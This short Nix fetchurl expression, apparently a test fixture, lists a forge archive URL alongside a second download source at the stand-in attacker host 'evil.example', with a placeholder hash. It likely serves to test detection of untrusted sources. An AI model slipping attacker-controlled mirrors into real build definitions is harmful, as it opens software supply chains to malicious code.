{ pkgs }:
pkgs.fetchurl {
  urls = [ "https://forge.ops.eblu.me/talos/a/archive/v1.tar.gz" ] ++ [ "https://evil.example/b/v1.tar.gz" ];
  hash = "sha256-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=";
}
